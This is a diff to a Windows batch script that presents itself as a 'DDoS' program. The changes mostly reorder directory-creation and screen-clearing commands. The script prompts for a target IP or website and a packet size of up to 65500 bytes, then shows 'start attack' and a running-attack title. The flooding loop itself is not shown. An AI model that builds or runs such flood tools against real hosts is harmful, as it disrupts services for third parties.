@@ -12,12 +12,14 @@ echo Author of this program does not take any responsibility for creating malici
 timeout 4 /nobreak > nul
 pause
 cls
-
+md run
+cls
 echo internet check
 timeout 2 /nobreak > nul
 ping 8.8.8.8 -l 128 -n 1
 timeout 1 /nobreak > nul
 md internet
+cls
 
 rem | checks if you have internet connection by pinging google's DNS (8.8.8.8) with 128 bytes
 
@@ -25,20 +27,18 @@ cls
 echo Loading...
 timeout 1 /nobreak > nul
 cls
-md ip
-md packet
 md files
-md run
+cls
 echo put an ip, address or website to send ddos.
 echo the program will automatically convert it to an ip.
 set /p ip=ip:
-
+md ip
 cls
 
 echo enter your packet size [1 to 65500]
 echo if your requests are getting timed out try setting this to something smaller.
 set /p size=size (in bytes):
-
+md packet
 cls
 
 :start
@@ -49,13 +49,14 @@ rem | confirmation
 echo start attack
 pause
 cls
-md start
-md attack
 echo click ctrl+c to stop.
 timeout 2 /nobreak > nul
+md attack
 cls
 
 title DDoS: Program running, %ip% %size% bytes, ctrl+c to stop.
+md start
+cls
 echo program start
 echo time: %time%
 
